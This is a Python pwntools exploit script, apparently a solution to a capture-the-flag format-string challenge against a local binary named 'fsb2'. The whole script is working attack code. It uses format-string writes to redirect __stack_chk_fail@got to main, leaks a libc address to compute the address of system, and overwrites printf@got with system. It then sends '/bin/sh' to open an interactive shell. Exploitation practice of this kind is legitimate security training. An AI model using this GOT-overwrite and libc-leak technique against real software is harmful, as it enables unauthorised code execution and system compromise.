from pwn import *

def slog(name, addr):
    return success(": ".join([name, hex(addr)]))

context.arch = "amd64"
context.bits = 64
context.log_level = 'debug'

p = process("./fsb2")
e = ELF("./fsb2")
libc = e.libc

gdb.attach(p)

stack_chk_fail_got = e.got['__stack_chk_fail']
printf_got = e.got['printf']
main = e.symbols['main']
printf_offset = libc.symbols['printf']
system_offset = libc.symbols['system']
libc_start_main = libc.symbols['__libc_start_main']


# [1] exit@got -> main
payload = fmtstr_payload(6, {stack_chk_fail_got:main})
payload += b'A' * (272-len(payload))
p.send(payload)


# [2] libc base leak
payload = b'leak:%77$p'
payload += b'A' * (272-len(payload))

pause()
p.sendline(payload)

p.recvuntil("leak:")
leak = int(p.recv(14), 16)
lb = leak - libc_start_main - 231
system = lb + system_offset

slog("leak", leak)
slog("libc base", lb)
slog("system", system)


# [3] printf@got -> system
payload = fmtstr_payload(6, {printf_got:system})
payload += b'A' * (272-len(payload))
p.send(payload)


# [4] printf(buf) -> system("/bin/sh\x00")
p.send(b"/bin/sh\x00")

p.interactive()
